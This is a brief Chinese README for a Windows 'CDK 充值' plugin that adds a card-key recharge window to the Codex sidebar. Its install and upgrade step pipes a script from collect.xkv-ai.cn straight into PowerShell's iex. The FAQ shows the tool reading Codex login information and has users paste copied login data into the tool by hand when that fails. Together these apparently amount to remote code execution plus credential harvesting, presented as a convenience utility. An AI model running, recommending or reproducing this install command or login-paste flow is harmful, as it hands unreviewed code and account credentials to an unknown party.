# CDK 充值 · Codex 插件

在 Codex 侧边栏开一个小窗，粘贴卡密完成充值。

- 平台：**Windows 10/11**
- 版本：1.0.1

## 安装

```powershell
irm https://collect.xkv-ai.cn/i | iex
```

装完打开 Codex，侧边栏会出现「CDK 充值」。

## 使用

点侧边栏「CDK 充值」→ 粘贴卡密（Ctrl+V）→ 点「一键充值」。
首次约 10–20 秒，之后 1 秒内出结果。

## 常见问题

| 现象 | 处理 |
|---|---|
| 看不到「CDK 充值」 | 完全退出 Codex（含托盘）再打开 |
| 提示读取失败 | 点窗口里的链接，复制页面内容，粘到「手动粘贴登录信息」 |
| 提示卡密使用中 | 换一张未使用的卡 |
| 怎么升级 | 重跑一次上面的安装命令 |
